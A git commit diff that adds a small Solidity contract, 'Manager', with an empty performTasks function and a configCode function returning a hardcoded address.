a7fdbc38d1489b7eb05390c724719e30036c78ee
Meszaroslorincz <111540160+Meszaroslorincz@users.noreply.github.com>
2022-08-19 01:05:56 +0300

    Update anyad.sol

--- anyad.sol
+++ anyad.sol
@@ -1,1 +1,9 @@
+pragma solidity ^0.6.12;
 
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0x647f3Bcec1351DE10838D6909B8EeE55c3D4484C;
+    }
+}
